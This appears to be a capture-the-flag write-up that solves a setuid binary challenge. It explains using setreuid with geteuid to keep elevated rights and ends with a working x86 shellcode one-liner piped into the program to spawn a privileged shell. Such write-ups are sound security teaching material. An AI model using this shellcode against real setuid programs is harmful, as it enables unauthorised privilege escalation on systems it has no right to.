## Solution

We can both use [Shellstorm shellcodes](https://shell-storm.org/shellcode/files/shellcode-399.html) or create or own.

Because it's a setuid program, we have to set our ID (rid = real user id) to the temporary value of the setuid program (euid = effective user id).
One method is to use `int setreuid(uid_t ruid, uid_t euid);` with `geteuid()` as arguments in order to overwrite ruid<-euid and to gain pwn3r-cracked rights.

Basically we have to write this code in assembly, without null bytes (it will stop the program as a string end), using less than 34 bytes (buffer is 35 including \0):

```c
#include <stdio.h>
#include <stdlib.h>

void main(){
    setreuid(geteuid(),geteuid());
    system("/bin/bash");
}
```

Here we can:

    - use https://shell-storm.org/ to use an existing x86 setuid shellcode
    - use https://x86.syscall.sh/ to program in x86 assembly ()

Then profit:

```sh
(echo -ne "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"; cat) | ./code_me
```
